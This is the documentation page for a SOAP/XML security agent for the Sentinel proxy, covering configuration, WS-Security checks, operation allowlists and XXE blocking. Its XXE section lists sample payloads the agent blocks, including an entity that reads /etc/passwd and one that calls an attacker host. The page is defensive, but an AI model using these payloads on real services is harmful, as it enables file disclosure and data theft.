+++
title = "SOAP Security"
weight = 170
description = "SOAP-specific security controls including envelope validation, WS-Security verification, operation control, and XXE prevention."
template = "agent.html"

[taxonomies]
tags = ["security", "soap", "xml", "api"]

[extra]
official = true
author = "Sentinel Core Team"
author_url = "https://github.com/raskell-io"
status = "Stable"
version = "0.2.0"
license = "Apache-2.0"
repo = "https://github.com/raskell-io/sentinel-agent-soap"
homepage = "https://sentinel.raskell.io/agents/soap/"
protocol_version = "v2"

# Installation methods
crate_name = "sentinel-agent-soap"
docker_image = ""

# Compatibility
min_sentinel_version = "26.01.0"
+++

## Protocol v2 Features

As of v0.2.0, the SOAP Security agent supports protocol v2 with:

- **Capability negotiation**: Reports supported features during handshake
- **Health reporting**: Exposes health status for monitoring
- **Metrics export**: Counter metrics for requests validated/blocked per violation type
- **gRPC transport**: Optional high-performance gRPC transport via `--grpc-address`
- **Lifecycle hooks**: Graceful shutdown and drain handling

## Overview

A comprehensive SOAP security agent for Sentinel that protects SOAP/XML web services from common attacks and abuse patterns. Uses [quick-xml](https://crates.io/crates/quick-xml) for fast, safe XML parsing with built-in XXE protection.

SOAP services remain critical in enterprise environments—banking, healthcare, government, and legacy integrations. This agent provides defense-in-depth controls specifically designed for SOAP 1.1/1.2 web services.

## Features

- **Envelope Validation**: SOAP 1.1/1.2 version control, header requirements, body depth limits
- **WS-Security**: Timestamp validation (replay prevention), UsernameToken, SAML assertions
- **Operation Control**: Allowlist/denylist with glob patterns for SOAP actions
- **XXE Prevention**: Blocks DOCTYPE declarations, external entities, and processing instructions
- **Body Validation**: Element count limits, text length limits, CDATA/comment blocking
- **SOAP Fault Responses**: Proper SOAP 1.1/1.2 fault format with violation details

## Installation

### Using Bundle (Recommended)

The easiest way to install this agent is via the Sentinel bundle command:

```bash
# Install just this agent
sentinel bundle install soap

# Or install all available agents
sentinel bundle install --all
```

The bundle command automatically downloads the correct binary for your platform and places it in `~/.sentinel/agents/`.

### Using Cargo

```bash
cargo install sentinel-agent-soap
```

### From Source

```bash
git clone https://github.com/raskell-io/sentinel-agent-soap
cd sentinel-agent-soap
cargo build --release
```

## Configuration

### Command Line

```bash
sentinel-agent-soap --config config.yaml --socket /var/run/sentinel/soap.sock
```

### Command Line Options

| Option | Description | Default |
|--------|-------------|---------|
| `--config`, `-c` | Path to YAML configuration file | `config.yaml` |
| `--socket`, `-s` | Unix socket path | `/tmp/sentinel-soap.sock` |
| `--grpc-address` | gRPC listen address (e.g., `0.0.0.0:50051`) | - |
| `--log-level`, `-l` | Log level (trace, debug, info, warn, error) | `info` |

### Configuration File (YAML)

```yaml
version: "1"

settings:
  max_body_size: 1048576  # 1MB
  debug_headers: false
  fail_action: block  # or "allow" for detect-only mode
  allowed_content_types:
    - "text/xml"
    - "application/soap+xml"
    - "application/xml"

envelope:
  enabled: true
  require_valid_envelope: true
  allowed_versions:
    - "1.1"
    - "1.2"
  require_header: false
  max_body_depth: 20

ws_security:
  enabled: true
  require_security_header: true
  require_timestamp: true
  max_timestamp_age_secs: 300  # 5 minutes
  require_username_token: false
  allowed_password_types:
    - PasswordDigest
  require_saml: false
  identity_header: "X-SOAP-Identity"

operations:
  enabled: true
  mode: allowlist  # or "denylist"
  actions:
    - "GetUser"
    - "ListUsers"
    - "Create*"
  require_soap_action_header: true
  validate_action_match: true

xxe_prevention:
  enabled: true
  block_doctype: true
  block_external_entities: true
  block_processing_instructions: true
  max_entity_expansions: 100

body_validation:
  enabled: true
  max_elements: 1000
  max_text_length: 65536  # 64KB
  block_cdata: false
  block_comments: false
  required_namespaces: []
```

### Sentinel Configuration

```kdl
agent "soap" {
    socket "/var/run/sentinel/soap.sock"
    timeout 100ms
    events ["request_headers" "request_body"]
}

route {
    match { path "/ws/*" }
    agents ["soap"]
    upstream "soap-backend"
}
```

## Envelope Validation

Validates SOAP envelope structure, version, and depth.

```xml
<!-- Valid SOAP 1.1 envelope -->
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <!-- Optional headers -->
  </soap:Header>
  <soap:Body>
    <m:GetUser xmlns:m="http://example.org/users">
      <m:UserId>123</m:UserId>
    </m:GetUser>
  </soap:Body>
</soap:Envelope>
```

**Configuration:**

| Option | Description | Default |
|--------|-------------|---------|
| `enabled` | Enable envelope validation | `true` |
| `require_valid_envelope` | Require valid SOAP structure | `true` |
| `allowed_versions` | Allowed SOAP versions (`1.1`, `1.2`) | `["1.1", "1.2"]` |
| `require_header` | Require SOAP Header element | `false` |
| `max_body_depth` | Maximum nesting depth in Body | `20` |

**SOAP Versions:**
- **SOAP 1.1**: `http://schemas.xmlsoap.org/soap/envelope/`
- **SOAP 1.2**: `http://www.w3.org/2003/05/soap-envelope`

## WS-Security Validation

Validates WS-Security headers for authentication and replay prevention.

```xml
<soap:Header>
  <wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
    <wsu:Timestamp xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
      <wsu:Created>2024-01-15T10:00:00Z</wsu:Created>
      <wsu:Expires>2024-01-15T10:05:00Z</wsu:Expires>
    </wsu:Timestamp>
    <wsse:UsernameToken>
      <wsse:Username>alice</wsse:Username>
      <wsse:Password Type="...#PasswordDigest">...</wsse:Password>
      <wsse:Nonce>...</wsse:Nonce>
      <wsu:Created>2024-01-15T10:00:00Z</wsu:Created>
    </wsse:UsernameToken>
  </wsse:Security>
</soap:Header>
```

**Configuration:**

| Option | Description | Default |
|--------|-------------|---------|
| `enabled` | Enable WS-Security validation | `false` |
| `require_security_header` | Require Security header | `false` |
| `require_timestamp` | Require Timestamp element | `false` |
| `max_timestamp_age_secs` | Max age for replay prevention | `300` |
| `require_username_token` | Require UsernameToken | `false` |
| `allowed_password_types` | Allowed password types | `[PasswordDigest]` |
| `require_saml` | Require SAML assertion | `false` |
| `identity_header` | Header to inject extracted username | `null` |

**Password Types:**
- `PasswordDigest` - Recommended, uses SHA-1 with nonce and timestamp
- `PasswordText` - Plain text, not recommended

## Operation Control

Control which SOAP operations are allowed using allowlist or denylist with glob patterns.

```yaml
operations:
  enabled: true
  mode: allowlist
  actions:
    - "GetUser"
    - "List*"       # Glob: ListUsers, ListOrders, etc.
    - "Create*"
  require_soap_action_header: true
  validate_action_match: true  # Verify SOAPAction matches body
```

**Denylist mode** - Block dangerous operations:

```yaml
operations:
  enabled: true
  mode: denylist
  actions:
    - "Delete*"
    - "Drop*"
    - "Admin*"
```

**Configuration:**

| Option | Description | Default |
|--------|-------------|---------|
| `enabled` | Enable operation control | `false` |
| `mode` | `allowlist` or `denylist` | `allowlist` |
| `actions` | List of operation patterns (glob) | `[]` |
| `require_soap_action_header` | Require SOAPAction HTTP header | `false` |
| `validate_action_match` | Verify header matches body operation | `false` |

## XXE Prevention

Prevents XML External Entity (XXE) attacks that could lead to data exfiltration or server-side request forgery.

**Blocked patterns:**

```xml
<!-- DOCTYPE declarations -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>

<!-- External entities -->
<!ENTITY xxe SYSTEM "http://attacker.com/steal">

<!-- Parameter entities -->
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
```

**Configuration:**

| Option | Description | Default |
|--------|-------------|---------|
| `enabled` | Enable XXE prevention | `true` |
| `block_doctype` | Block DOCTYPE declarations | `true` |
| `block_external_entities` | Block SYSTEM/PUBLIC entities | `true` |
| `block_processing_instructions` | Block `<?...?>` instructions | `true` |
| `max_entity_expansions` | Max internal entity expansions | `100` |

## Body Validation

Validates SOAP body content to prevent abuse.

**Configuration:**

| Option | Description | Default |
|--------|-------------|---------|
| `enabled` | Enable body validation | `true` |
| `max_elements` | Maximum elements in body | `1000` |
| `max_text_length` | Max text content per element | `65536` |
| `block_cdata` | Block CDATA sections | `false` |
| `block_comments` | Block XML comments | `false` |
| `required_namespaces` | Required body namespaces | `[]` |

## Response Headers (Debug Mode)

When `debug_headers: true`:

| Header | Description |
|--------|-------------|
| `X-SOAP-Body-Depth` | Maximum nesting depth found |
| `X-SOAP-Element-Count` | Total elements in body |
| `X-SOAP-Max-Text-Length` | Longest text content |
| `X-SOAP-Validated` | Set to `true` on success |
| `X-SOAP-Operation` | Detected operation name |

## Error Responses

Errors are returned as proper SOAP Faults:

**SOAP 1.1 Fault:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <soap:Fault>
      <faultcode>soap:Client</faultcode>
      <faultstring>[DOCTYPE_DETECTED] DOCTYPE declarations are not allowed</faultstring>
      <detail>
        <sentinel:violations xmlns:sentinel="urn:sentinel:soap:security">
          <sentinel:violation code="DOCTYPE_DETECTED">DOCTYPE declarations are not allowed</sentinel:violation>
        </sentinel:violations>
      </detail>
    </soap:Fault>
  </soap:Body>
</soap:Envelope>
```

**SOAP 1.2 Fault:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
  <soap:Body>
    <soap:Fault>
      <soap:Code>
        <soap:Value>soap:Sender</soap:Value>
      </soap:Code>
      <soap:Reason>
        <soap:Text xml:lang="en">[OPERATION_NOT_ALLOWED] Operation 'DeleteUser' is not allowed</soap:Text>
      </soap:Reason>
      <soap:Detail>
        <sentinel:violations xmlns:sentinel="urn:sentinel:soap:security">
          <sentinel:violation code="OPERATION_NOT_ALLOWED">Operation 'DeleteUser' is not allowed</sentinel:violation>
        </sentinel:violations>
      </soap:Detail>
    </soap:Fault>
  </soap:Body>
</soap:Envelope>
```

**Error codes:**
- `INVALID_XML` - Malformed XML syntax
- `MISSING_ENVELOPE` - No SOAP Envelope found
- `UNSUPPORTED_VERSION` - SOAP version not allowed
- `BODY_DEPTH_EXCEEDED` - Nesting too deep
- `MISSING_SECURITY_HEADER` - WS-Security required but missing
- `TIMESTAMP_EXPIRED` - Security timestamp too old
- `OPERATION_NOT_ALLOWED` - Operation blocked by policy
- `DOCTYPE_DETECTED` - XXE attack (DOCTYPE)
- `EXTERNAL_ENTITY_DETECTED` - XXE attack (entity)
- `TOO_MANY_ELEMENTS` - Body element limit exceeded

## Detect-Only Mode

Monitor without blocking by setting `fail_action: allow`:

```yaml
settings:
  fail_action: allow  # Log violations but don't block
  debug_headers: true  # Add metrics headers
```

## Related Agents

| Agent | Integration |
|-------|-------------|
| **[Auth](/agents/auth/)** | Authenticate requests before SOAP processing |
| **[Rate Limit](/agents/ratelimit/)** | Rate limit by client or operation |
| **[WAF](/agents/waf/)** | Additional injection and attack protection |
| **[Audit Logger](/agents/audit-logger/)** | Log all SOAP operations |

## Resources

- [GitHub Repository](https://github.com/raskell-io/sentinel-agent-soap)
- [quick-xml](https://crates.io/crates/quick-xml)
- [WS-Security Specification](https://www.oasis-open.org/committees/tc_home.php?wg_abbrev=wss)
- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
